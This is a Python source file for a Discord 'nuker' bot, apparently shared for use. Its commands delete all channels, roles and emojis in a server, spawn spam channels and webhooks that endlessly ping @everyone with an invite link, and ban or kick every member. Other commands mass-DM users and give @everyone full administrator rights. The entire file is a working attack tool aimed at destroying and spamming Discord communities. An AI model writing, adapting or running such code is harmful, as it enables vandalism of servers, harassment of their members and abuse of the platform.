#made by mauraa 
import discord
import asyncio
import colorama
import json
import random
import os
from discord.ext import commands
from discord import Permissions
from discord import Webhook, AsyncWebhookAdapter


client = commands.Bot(command_prefix=">", intents = discord.Intents.all())
client.remove_command('help')
######################################setup########################################

token = "BOT-TOKEN"

channel_names = [' looted on top !', 'ur very ugly', 'nuked', 'looted W']
message_spam = ['@everyone we merging, join : https://discord.gg/tHUWmrdr6t']
webhook_names = ['looted W', 'nuked']

###################################################################################
@client.event
async def on_ready():
  await client.change_presence(activity=discord.Game(name= "mora#1999 for robux"))#change this if you want
  print(f''' 
\x1b[38;5;172m┬─┐┌─┐─┐ ┬  ┌┐┌┬ ┬┬┌─┌─┐┬─┐
\033[90m├┬┘├┤ ┌┴┬┘  ││││ │├┴┐├┤ ├┬┘
\033[37m┴└─└─┘┴ └─  ┘└┘└─┘┴ ┴└─┘┴└─
\x1b[38;5;172m═══════════════════════════
\x1b[38;5;172mLogged In As {client.user}
\x1b[38;5;172mType !help To Begin Nuking
\x1b[38;5;172mVersion: Free Beta v0.2
\x1b[38;5;172m═══════════════════════════
''')

@client.command()
async def nuke(ctx, amount=50):
  await ctx.message.delete()
  await ctx.guild.edit(name="nuked by looted")#change this if u want
  channels = ctx.guild.channels
  for channel in channels:
    try:
      await channel.delete()
      print(f"\x1b[38;5;34m{channel.name} Has Been Successfully Deleted!")
    except:
        pass
        print ("\x1b[38;5;196mUnable To Delete Channel!")
        guild = ctx.message.guild
  for i in range(amount):
    try:  
      await ctx.guild.create_text_channel(random.choice(channel_names))
      print(f"\x1b[38;5;34mSuccessfully Made Channel [{i}]!")
    except:
      print("\x1b[38;5;196mUnable To Create Channel!")
  for role in ctx.guild.roles:
    try:
      await role.delete()
      print(f"\x1b[38;5;34m{role.name} \x1b[38;5;34mHas Been Successfully Deleted!")

    except:
      print(f"\x1b[38;5;196m{role.name} Is Unable To Be Deleted")
  await asyncio.sleep(2)
  for i in range(100):  
    for i in range(1000):
      for channel in ctx.guild.channels:
        try:
          await channel.send(random.choice(message_spam)
        )
          print(f"\x1b[38;5;34m{channel.name} Has Been Pinged!")
        except:
          print(f"\x1b[38;5;196mUnable To Ping {channel.name}!")
    for member in list (ctx.guild.members):
        try:
          await member.ban(reason="Hex Nuker!")#change this if u want
          print(f"\x1b[38;5;34m{member.name} Has Been Successfully Banned In {ctx.guild.name}")
        except:
          print(f"\x1b[38;5;196mUnable To Ban {member.name} In {ctx.guild.name}!")
          

@client.event
async def on_guild_channel_create(channel):
  while True:
    await channel.send(random.choice(message_spam))


@client.event
async def on_guild_channel_create(channel):
  webhook =await channel.create_webhook(name = random.choice(webhook_names))  
  while True:  
    await channel.send(random.choice(message_spam))
    await webhook.send(random.choice(message_spam), username=random.choice(webhook_names))



@client.command()
async def banall(ctx):
  await ctx.message.delete()
  for member in ctx.guild.members:
    if member.id != 1:
     for user in list(ctx.guild.members):
       try:
         await ctx.guild.ban(user)
         print (f"\x1b[38;5;34m{member.name} Has Been Successfully Banned In {ctx.guild.name}")
       except:
         print(f"\x1b[38;5;196mUnable To Ban {member.name} In {ctx.guild.name}!")
  


@client.command()
async def kickall(ctx):
  await ctx.message.delete()
  for member in ctx.guild.members:
    try:
      await member.kick(reason="llllll")
      print(f"\x1b[38;5;34m{member.name} Has Been Successfully Kicked In {ctx.guild.name}")
    except:
      print(f"\x1b[38;5;196mUnable To Kick {member.name} In {ctx.guild.name}!")


@client.command()
async def rolespam(ctx):
  await ctx.message.delete()
  for i in range(1, 250):
    try:
      await ctx.guild.create_role(name=f"rex nuker on top")
      print(f"\x1b[38;5;34mSuccessfully Created Role In {ctx.guild.name}!")
    except:
      print(f"\x1b[38;5;196mUnable To Create Roles In {ctx.guild.name}!")


@client.command(pass_context=True)
async def emojidel(ctx):
 await ctx.message.delete()
 for emoji in list(ctx.guild.emojis):
            try:
                await emoji.delete()
                print (f"\x1b[38;5;34mSuccessfully Deleted Emoji {emoji.name} In {ctx.guild.name}!")
            except:
                print (f"\x1b[38;5;196mUnable To Delete Emoji {emoji.name} In {ctx.guild.name}!")


@client.command()
async def dm(ctx, *, message:str):
  await ctx.message.delete()
  for user in list(ctx.guild.members):
    try:
      await user.send(message)
      print(f"\x1b[38;5;34mDMed All Members In {ctx.guild.name}!")
    except:
      print(f"\x1b[38;5;196mUnable To DM Members In {ctx.guild.name}!")


@client.command(pass_context=True)
async def admin(ctx):
  await ctx.message.delete()
  for role in list(ctx.guild.roles):
             if role.name == '@everyone':
                  try:
                      await role.edit(permissions=Permissions.all())
                      print(f"\x1b[38;5;34mGave @everyone Admin In {ctx.guild.name}!") 
                  except:
                      print(f"\x1b[38;5;196mUnable To Give @everyone Admin In {ctx.guild.name}!")


@client.command()
async def help(ctx, *args):
    await ctx.message.delete()
    retStr = str("""```fix\n>nuke - Destroys Guild\n\n>banall - Bans All Members \n\n>kickall - Kicks All Members\n\n>rolespam - Spams Roles\n\n>emojidel - Deletes All Emojis\n\n>dm [Input] - Dms Everyone In Guild\n\n>admin - Gives Everyone Admin```""")
    embed = discord.Embed(color=14177041,title="YoHex Discord Nuker")
    embed.add_field(name="Hex Nuker Help",value=retStr)
    embed.set_footer(text=f"Requested By {ctx.author} | ™Hex Nuker | Made By mora#1999")

    await ctx.send(embed=embed)


client.run(token)
